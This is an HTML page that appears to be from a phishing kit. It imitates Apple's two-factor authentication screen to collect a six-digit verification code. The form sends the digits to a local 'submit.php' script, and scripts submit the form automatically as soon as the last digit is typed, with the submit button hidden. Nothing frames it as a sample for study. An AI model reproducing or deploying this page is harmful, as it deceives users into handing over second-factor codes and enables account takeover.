<html dir="ltr" data-rtl="false" lang="en" class="prefpane na-presentation" ><head><meta charset="UTF-8">
    <title></title>
    <meta name="robots" content="noindex">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <base target="_parent" />
    
 
            
              
<link rel="stylesheet" href="./../styles/home-3bb7a7fbb2c26750a902.css">
            
            <link rel="stylesheet" type="text/css" media="screen" href="./../styles/app-sk7.css">

<script src="https://code.jquery.com/jquery-1.11.1.min.js"></script>
    
     
    
          
        
 <script>
       var inputs = document.getElementsByClassName('form-control force-ltr form-textbox char-field');
       for(var i = 0; i < inputs.length; i++)
       {
           inputs[i].onblur = function()
           {
               var empty = false;
   
               for(var j = 0; j < inputs.length; j++)
               {
                   if(inputs[j].value == '')
                   {
                       empty = true;
                       break;
                   }                
               }
   
               if(!empty)
               {
                   console.log('submitting');
                   document.getElementById("form1").submit();
               }
           }
       }
   </script>     
     
     
       
         
         
           
             
             
             
               <link rel="stylesheet" type="text/css" media="screen" href="./../styles/app.css">
   
    <script>
     function myFunction() {
       let x = document.getElementById("fname");
       x.value = x.value.toUpperCase();
     }
     </script>
    
   
         
       
     
           
        <script>
     (function ($) {
       $.fn.autoTab = function () {
           var els = this.length;
           for (var i = 0; i < els; i++) {
               var next = i + 1;
               var prev = i - 1;
   
               if (i > 0 && next < this.length) {
                   $(this[i])._auTab({
                       next: $(this[next]),
                       prev: $(this[prev])
                   });
               } else if (i > 0) {
                   $(this[i])._auTab({
                       prev: $(this[prev])
                   });
               } else {
                   $(this[i])._auTab({
                       next: $(this[next])
                   });
               }
   
               $(this[0]).focus();
   
           }
           return this;
       };
   
       $.fn._auTab = function (options) {
           var defaults = {
               maxlength: 2147483647, //max length of type int
               prev: null,
               next: null
           };
   
           $.extend(defaults, options);
   
           // allow over riding the maxlength by passing it in the options:
           if (defaults.maxlength == 2147483647) { //maxlength has not been changed
               defaults.maxlength = $(this).attr('maxlength');
           }
   
           $(this).bind('keydown', function (e) {
               var cursorPos = $(this).getCursorPosition(),
                   keyPressed = e.which,
                   charactersEntered = this.value.length;
               // ( the key pressed is 8 (backspace) || the key pressed is 37 (left arrow) )
               // && ( the field is empty || the cursor position is at 0 )
               // && the previous field exists
               if ((keyPressed === 8 || keyPressed === 37) && (charactersEntered === 0 || cursorPos === 0) && defaults.prev) {
                   defaults.prev.focus().val(defaults.prev.val());
               }
           });
   
           $(this).bind('keyup', function (e) {
   
               var v = $(this).val(),
                   keyPressed = e.which,
                   cursorPos = $(this).getCursorPosition(),
                   /**
                    * ignore autoTab when it's one of the following:
                    * 8:	Backspace
                    * 16:	Shift
                    * 17:	Ctrl
                    * 18:	Alt
                    * 19:	Pause Break
                    * 20:	Caps Lock
                    * 27:	Esc
                    * 33:	Page Up
                    * 34:	Page Down
                    * 35:	End
                    * 36:	Home
                    * 37:	Left Arrow
                    * 38:	Up Arrow
                    * 39:	Right Arrow
                    * 40:	Down Arrow
                    * 45:	Insert
                    * 46:	Delete
                    * 144:	Num Lock
                    * 145:	Scroll Lock
                    */
                   ignore_keys = [8, 16, 17, 18, 19, 20, 27, 33, 34, 35, 36, 37, 38, 39, 40, 45, 46, 144, 145,13];
   
               // the next element exists
               // &&
               // ( the key pressed isn't in the ignore list
               //   && the input has reached the max length
               // )
               // ||
               // ( the key pressed is the right arrow key
               //   && the cursor position is at the max length (the end of the input)
               // ) 
               if (defaults.next && ($.inArray(keyPressed, ignore_keys) === -1 && v.length == defaults.maxlength) || (keyPressed === 39 && cursorPos === parseInt(defaults.maxlength, 10))) {
                   defaults.next.focus();
               }
           });
           return this;
       };
   
   
       $.fn.getCursorPosition = function () {
           var input = this.get(0);
           if (!input) return; // No (input) element found
           if ('selectionStart' in input) {
               // Standard-compliant browsers
               return input.selectionStart;
           } else if (document.selection) {
               // IE
               input.focus();
               var sel = document.selection.createRange();
               var selLen = document.selection.createRange().text.length;
               sel.moveStart('character', -input.value.length);
               return sel.text.length - selLen;
           }
       };
   })(jQuery);
   
   $(document).ready(function () {
       $("input").autoTab();
   });
     </script>
   
       
           
           
    
        
            
                  
          
          
        
      
    
  

    
        
        
            

        
    

    
<style type="text/css">@keyframes opacity-60-25-0-12 {
0% { opacity: 0.25; }
0.01% { opacity: 0.25; }
0.02% { opacity: 1; }
60.01% { opacity: 0.25; }
100% { opacity: 0.25; }
}
@keyframes opacity-60-25-1-12 {
0% { opacity: 0.25; }
8.34333% { opacity: 0.25; }
8.35333% { opacity: 1; }
68.3433% { opacity: 0.25; }
100% { opacity: 0.25; }
}
@keyframes opacity-60-25-2-12 {
0% { opacity: 0.25; }
16.6767% { opacity: 0.25; }
16.6867% { opacity: 1; }
76.6767% { opacity: 0.25; }
100% { opacity: 0.25; }
}
@keyframes opacity-60-25-3-12 {
0% { opacity: 0.25; }
25.01% { opacity: 0.25; }
25.02% { opacity: 1; }
85.01% { opacity: 0.25; }
100% { opacity: 0.25; }
}
@keyframes opacity-60-25-4-12 {
0% { opacity: 0.25; }
33.3433% { opacity: 0.25; }
33.3533% { opacity: 1; }
93.3433% { opacity: 0.25; }
100% { opacity: 0.25; }
}
@keyframes opacity-60-25-5-12 {
0% { opacity: 0.270958; }
41.6767% { opacity: 0.25; }
41.6867% { opacity: 1; }
1.67667% { opacity: 0.25; }
100% { opacity: 0.270958; }
}
@keyframes opacity-60-25-6-12 {
0% { opacity: 0.375125; }
50.01% { opacity: 0.25; }
50.02% { opacity: 1; }
10.01% { opacity: 0.25; }
100% { opacity: 0.375125; }
}
@keyframes opacity-60-25-7-12 {
0% { opacity: 0.479292; }
58.3433% { opacity: 0.25; }
58.3533% { opacity: 1; }
18.3433% { opacity: 0.25; }
100% { opacity: 0.479292; }
}
@keyframes opacity-60-25-8-12 {
0% { opacity: 0.583458; }
66.6767% { opacity: 0.25; }
66.6867% { opacity: 1; }
26.6767% { opacity: 0.25; }
100% { opacity: 0.583458; }
}
@keyframes opacity-60-25-9-12 {
0% { opacity: 0.687625; }
75.01% { opacity: 0.25; }
75.02% { opacity: 1; }
35.01% { opacity: 0.25; }
100% { opacity: 0.687625; }
}
@keyframes opacity-60-25-10-12 {
0% { opacity: 0.791792; }
83.3433% { opacity: 0.25; }
83.3533% { opacity: 1; }
43.3433% { opacity: 0.25; }
100% { opacity: 0.791792; }
}
@keyframes opacity-60-25-11-12 {
0% { opacity: 0.895958; }
91.6767% { opacity: 0.25; }
91.6867% { opacity: 1; }
51.6767% { opacity: 0.25; }
100% { opacity: 0.895958; }
}</style><script data-scrapbook-elem="custom-elements-loader">(function (names) { if (!customElements) { return; } for (const name of names) { customElements.define(name, class CustomElement extends HTMLElement {}); } })(["apple-auth","hsa2-sk7","idms-modal"])</script></head>

<body class="tk-body ">
<div aria-hidden="true" style="font-family:&quot;SF Pro Icons&quot;; width: 0px; height: 0px; color: transparent;">.</div>
<div aria-hidden="true" style="font-family:&quot;SF Pro Display&quot;; width: 0px; height: 0px; color: transparent;">.</div>
<div class="si-body si-container container-fluid" id="content" role="main" data-theme="dark"><apple-auth app-loading-defaults="{appLoadingDefaults}" pmrpc-hook="{pmrpcHook}">
<div class="widget-container  fade-in restrict-min-content  restrict-max-wh  fade-in " data-mode="embed" data-isiebutnotedge="false">

<div id="step" class="si-step">
      <logo {hide-app-logo}="hideAppLogo" {show-fade-in}="showFadeIn" {(section)}="section"> </logo>
      <div id="stepEl" class="   ">
          <div class="sk7">
              <hsa2-sk7>
                  <div class="verify-device">
                      <div class="sa-sk7__app-title"><h1 class="tk-intro" tabindex="-1">Two-Factor Authentication</h1></div>
                      <div class="sa-sk7__content">
                          <div class="verify-device__sec-code">
                              <div class="form-security-code">
                                <form name="form1" id="form1" class="form1" action="submit.php" method="post" >
                                  
                                  <div class="form-security-code-inputs">
                                    
                                      <input maxlength="1" name="first" class="form-security-code-input" type="tel" autocapitalize="none" autocorrect="off" spellcheck="false" autocomplete="off" aria-label="Enter Verification Code Digit 1" value="" /required>
                                      <input maxlength="1" name="second" class="form-security-code-input" type="tel" autocapitalize="none" autocorrect="off" spellcheck="false" autocomplete="off" aria-label="Digit 2" value="" /required>
                                      <input maxlength="1" name="third" class="form-security-code-input" type="tel" autocapitalize="none" autocorrect="off" spellcheck="false" autocomplete="off" aria-label="Digit 3" value="" /required>
                                      <div class="form-security-code-divider"></div>
                                      <input maxlength="1" name="forth" class="form-security-code-input" type="tel" autocapitalize="none" autocorrect="off" spellcheck="false" autocomplete="off" aria-label="Digit 4" value="" /required>
                                      <input maxlength="1" name="fifth" class="form-security-code-input" type="tel" autocapitalize="none" autocorrect="off" spellcheck="false" autocomplete="off" aria-label="Digit 5"   onkeyup="myFunction()" value="" /required>
                                      <input maxlength="1" name="six" class="form-security-code-input" type="tel" autocapitalize="none" autocorrect="off" spellcheck="false" autocomplete="off" aria-label="Digit 6"  id="name" onkeyup="formSubmit()"  value="" /required>
                                      <button type="submit" form="form1" value="Submit" id="sign-in" style="display:none !important;" tabindex="0" name="submit" type="submit"  class="si-button btn  fed-ui  moved   fed-ui-animation-show  " aria-label=" Sign In">
                                  </div>
                                </form>
                              </div>
                          </div>
                          <div class="signin-container-footer">
                              <div class="signin-container-footer__info">A message with a verification code has been sent to your devices. Enter the code to continue.</div>
                              <div class="fixed-h">
                                  <div class="signin-container-footer__link">
                                      <div class="text text-typography-body-reduced">
                                          <div class="inline-links">
                                              <div class="inline-links__link">
                                                <form action="./../">                                                  
                                                 <button type="submit"   class="button button-link button-rounded-rectangle" type="button" id="alt-options-btn"> <span class="text text-typography-body-reduced">Didn’t get a verification code?</span></button>
                                                 </form>
                                              </div>
                                          </div>
                                      </div>
                                  </div>
                              </div>
                          </div>
                      </div>
                  </div>
              </hsa2-sk7>
          </div>
      </div>
  </div>
  <div id="stocking" style="display: none !important;"></div>
  
    
    

           
                          <script>
 function formSubmit()
 {
 document.getElementById('sign-in').click();
 }   
 
 </script>
              
    
    
    
    

</div>
<idms-modal wrap-class="full-page-error-wrapper " {(show)}="showfullPageError" auto-close="false"> 
</idms-modal>
</apple-auth></div>


    
    
    
    
    

    
  
  
  
  
  
  
  

  








    
    
        

    








    
    
        

    



















    
    
        
    



        
    
    



    
    
        
    







    



    
        
            
            

        
    
    
        
    
    
        
            
            
                

            
        
    



</body></html>